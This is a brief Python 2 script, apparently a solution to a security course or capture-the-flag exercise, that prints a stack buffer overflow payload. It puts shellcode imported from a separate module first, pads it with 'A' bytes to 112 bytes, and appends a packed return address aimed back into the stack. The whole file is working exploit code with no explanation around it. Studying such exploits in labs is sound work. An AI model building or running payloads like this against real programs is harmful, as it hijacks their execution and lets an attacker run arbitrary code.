from shellcode import shellcode
from struct import pack

shellcode_addr = 0xbffe9988 - 0x6c;

print shellcode + 'A'*(112-len(shellcode)) + pack('<I', shellcode_addr)
